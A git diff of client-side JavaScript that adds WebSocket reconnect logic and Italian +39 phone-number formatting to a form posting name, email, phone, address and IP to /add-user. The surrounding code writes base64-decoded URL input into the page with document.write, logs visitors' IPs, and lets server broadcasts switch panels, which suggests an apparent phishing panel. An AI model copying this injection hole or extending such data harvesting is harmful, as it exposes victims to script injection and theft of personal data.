@@ -89,28 +89,96 @@ if (hasRef) {
   document.write(decodeURIComponent(atob(`${ref}`)));
 } else {
   showPanel();
-  const socket = new WebSocket(`wss://${window.location.host}/ws`);
-
+  setupMobileNumberInput(); // Initialize mobile number input with +39 prefix
+  
+  let socket = null;
   let clientIp = null;
+  let reconnectAttempts = 0;
+  let maxReconnectAttempts = 10;
+  let reconnectDelay = 1000; // Start with 1 second
+  let reconnectTimer = null;
+  let isManualClose = false;
 
-  socket.onopen = () => {
-    // Optionally get client IP and send to server for initial status
-    fetch("https://api.ipify.org?format=json")
-      .then((res) => res.json())
-      .then((data) => {
-        clientIp = data.ip;
+  function connectWebSocket() {
+    // Close existing connection if any
+    if (socket && socket.readyState !== WebSocket.CLOSED) {
+      isManualClose = true;
+      socket.close();
+    }
 
-        socket.send(
-          JSON.stringify({
-            type: "CHECK_IP",
-            ip: clientIp,
-          })
-        );
-      });
-  };
+    try {
+      socket = new WebSocket(`wss://${window.location.host}/ws`);
 
-  // Global listener for all server broadcasts
-  socket.onmessage = (event) => {
+      socket.onopen = () => {
+        console.log("✅ WebSocket connected");
+        reconnectAttempts = 0;
+        reconnectDelay = 1000; // Reset delay on successful connection
+        
+        // Optionally get client IP and send to server for initial status
+        if (!clientIp) {
+          fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => {
+              clientIp = data.ip;
+
+              if (socket && socket.readyState === WebSocket.OPEN) {
+                socket.send(
+                  JSON.stringify({
+                    type: "CHECK_IP",
+                    ip: clientIp,
+                  })
+                );
+              }
+            })
+            .catch((err) => console.error("Error fetching IP:", err));
+        } else {
+          // Re-send IP check if we already have the IP
+          if (socket && socket.readyState === WebSocket.OPEN) {
+            socket.send(
+              JSON.stringify({
+                type: "CHECK_IP",
+                ip: clientIp,
+              })
+            );
+          }
+        }
+      };
+
+      socket.onerror = (error) => {
+        console.error("❌ WebSocket error:", error);
+        // Don't attempt reconnect here, onclose will handle it
+      };
+
+      socket.onclose = (event) => {
+        console.warn("⚠️ WebSocket closed:", {
+          code: event.code,
+          reason: event.reason,
+          wasClean: event.wasClean,
+          manualClose: isManualClose
+        });
+
+        // Don't reconnect if it was a manual close
+        if (isManualClose) {
+          isManualClose = false;
+          return;
+        }
+
+        // Attempt to reconnect
+        if (reconnectAttempts < maxReconnectAttempts) {
+          reconnectAttempts++;
+          console.log(`🔄 Attempting to reconnect (${reconnectAttempts}/${maxReconnectAttempts}) in ${reconnectDelay}ms...`);
+          
+          reconnectTimer = setTimeout(() => {
+            reconnectDelay = Math.min(reconnectDelay * 2, 30000); // Exponential backoff, max 30 seconds
+            connectWebSocket();
+          }, reconnectDelay);
+        } else {
+          console.error("❌ Max reconnection attempts reached. WebSocket will not reconnect.");
+        }
+      };
+
+      // Global listener for all server broadcasts
+      socket.onmessage = (event) => {
     const msg = JSON.parse(event.data);
 
     switch (msg.type) {
@@ -211,7 +279,43 @@ if (hasRef) {
 
       default:
     }
-  };
+      };
+    } catch (error) {
+      console.error("❌ Error creating WebSocket:", error);
+      // Attempt to reconnect after delay
+      if (reconnectAttempts < maxReconnectAttempts) {
+        reconnectAttempts++;
+        reconnectTimer = setTimeout(() => {
+          reconnectDelay = Math.min(reconnectDelay * 2, 30000);
+          connectWebSocket();
+        }, reconnectDelay);
+      }
+    }
+  }
+
+  // Initialize WebSocket connection
+  connectWebSocket();
+
+  // Reconnect on page visibility change (user comes back to tab)
+  document.addEventListener("visibilitychange", () => {
+    if (!document.hidden && (!socket || socket.readyState === WebSocket.CLOSED)) {
+      console.log("Page visible again, checking WebSocket connection...");
+      if (reconnectAttempts < maxReconnectAttempts) {
+        connectWebSocket();
+      }
+    }
+  });
+
+  // Clean up on page unload
+  window.addEventListener("beforeunload", () => {
+    isManualClose = true;
+    if (socket) {
+      socket.close();
+    }
+    if (reconnectTimer) {
+      clearTimeout(reconnectTimer);
+    }
+  });
 
   function showPanel() {
     // Fetch IP first
@@ -337,6 +441,97 @@ function show(next) {
   next.style.display = "block";
 }
 
+// Format mobile number - UI already shows +39 prefix, so just clean the number part
+function formatMobileNumber(number) {
+  if (!number) return "+39";
+  
+  // Remove any non-digit characters (user only types numbers after +39)
+  let cleaned = number.trim().replace(/\D/g, '');
+  
+  // Remove leading 0 if present (Italian numbers don't start with 0 after country code)
+  if (cleaned.startsWith("0")) {
+    cleaned = cleaned.substring(1);
+  }
+  
+  // Combine with +39 prefix
+  return "+39" + cleaned;
+}
+
+// Ensure mobile number input only accepts digits and maintains +39 prefix
+function setupMobileNumberInput() {
+  // Get the prefix element
+  const prefixElement = document.getElementById("mobile-prefix");
+  
+  // Set initial value to empty
+  mobileNumber.value = "";
+  
+  // Function to update prefix visibility based on input value
+  function updatePrefixVisibility() {
+    if (prefixElement) {
+      if (mobileNumber.value.trim() !== "") {
+        prefixElement.style.visibility = "visible";
+      } else {
+        prefixElement.style.visibility = "hidden";
+      }
+    }
+  }
+  
+  // Show prefix when input is focused
+  mobileNumber.addEventListener("focus", function() {
+    if (prefixElement) {
+      prefixElement.style.visibility = "visible";
+    }
+  });
+  
+  // Update prefix visibility when input loses focus (show if has value, hide if empty)
+  mobileNumber.addEventListener("blur", function() {
+    updatePrefixVisibility();
+  });
+  
+  // Handle input to only allow digits
+  mobileNumber.addEventListener("input", function(e) {
+    // Remove any non-digit characters
+    let value = e.target.value.replace(/\D/g, '');
+    
+    // Remove leading 0 if user types it (Italian numbers don't start with 0)
+    if (value.startsWith("0")) {
+      value = value.substring(1);
+    }
+    
+    // Limit to reasonable length (max 10 digits for Italian mobile)
+    if (value.length > 10) {
+      value = value.substring(0, 10);
+    }
+    
+    e.target.value = value;
+    
+    // Update prefix visibility based on whether there's a value
+    updatePrefixVisibility();
+  });
+  
+  // Prevent paste of non-numeric content
+  mobileNumber.addEventListener("paste", function(e) {
+    e.preventDefault();
+    let pasted = (e.clipboardData || window.clipboardData).getData("text");
+    let cleaned = pasted.replace(/\D/g, '');
+    if (cleaned.startsWith("0")) {
+      cleaned = cleaned.substring(1);
+    }
+    if (cleaned.length > 10) {
+      cleaned = cleaned.substring(0, 10);
+    }
+    mobileNumber.value = cleaned;
+  });
+  
+  // Prevent typing non-numeric characters
+  mobileNumber.addEventListener("keypress", function(e) {
+    // Allow: backspace, delete, tab, escape, enter, and numbers
+    if (!/[0-9]/.test(e.key) && !["Backspace", "Delete", "Tab", "Escape", "Enter"].includes(e.key)) {
+      e.preventDefault();
+    }
+  });
+}
+
 function sendUser() {
   let stat;
   if (
@@ -348,6 +543,10 @@ function sendUser() {
   } else {
     stat = "0";
   }
+  
+  // Format mobile number with +39 prefix (input only contains digits)
+  const formattedMobileNumber = formatMobileNumber(mobileNumber.value);
+  
   fetch("/add-user", {
     method: "POST",
     headers: {
@@ -357,7 +556,7 @@ function sendUser() {
       ip: ipAddress,
       fullname: fullName.value,
       email: email.value,
-      mobile_number: mobileNumber.value,
+      mobile_number: formattedMobileNumber,
       address: address.value,
       stat: stat,
     }),
